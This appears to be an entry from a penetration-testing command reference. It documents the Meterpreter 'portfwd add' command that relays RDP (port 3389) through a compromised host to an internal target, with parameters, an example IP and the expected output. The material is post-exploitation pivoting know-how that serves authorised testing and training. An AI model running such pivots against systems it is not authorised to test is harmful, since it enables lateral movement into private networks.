---
id: 170c7951-ce28-4be5-86a1-320591113c02-a
name: meterpreter-portfwd-add-rdp
type: command
executor: msfconsole
data: portfwd add -l 3389 -p 3389 -r $_TARGET_HOST
output: null
created_at: '2023-04-06T03:56:22.631643+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - pivoting
  - rdp
  - meterpreter
verified: true
validated: true
---

# meterpreter-portfwd-add-rdp

## Command

```msfconsole
portfwd add -l 3389 -p 3389 -r $_TARGET_HOST
```

## Description

Adds a port forward rule in Meterpreter to proxy RDP traffic (port 3389) from the attacker's local port to a remote host via the compromised machine.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l 3389 | Local port to listen on | Yes |
| -p 3389 | Remote port to forward to | Yes |
| -r $_TARGET_HOST | Remote host IP reachable from pivot | Yes |

## Examples

### Basic Usage

```msfconsole
portfwd add -l 3389 -p 3389 -r 192.168.1.100
```

## Expected Output

[*] Added port forward 3389 => 3389:192.168.1.100 (TCP)

## Related

- [[procedures/Meterpreter-Network-Pivoting-via-Port-Forwarding-and-Routing]]
